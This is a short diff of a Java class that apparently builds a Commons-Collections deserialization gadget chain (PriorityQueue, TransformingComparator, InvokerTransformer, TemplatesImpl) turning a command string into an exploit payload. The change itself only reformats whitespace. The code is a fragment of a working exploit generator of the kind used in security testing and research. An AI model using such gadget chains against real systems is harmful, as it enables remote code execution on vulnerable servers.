@@ -19,8 +19,8 @@ public class cc2 implements ObjectPayload<Queue<Object>> {
     public Queue<Object> getObject(String command) throws Exception {
         final Object templates;
         templates = Gadgets.createTemplatesImpl(command);
-        final InvokerTransformer    transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
-        final PriorityQueue<Object> queue       = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
+        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
+        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
         queue.add(1);
         queue.add(1);
 
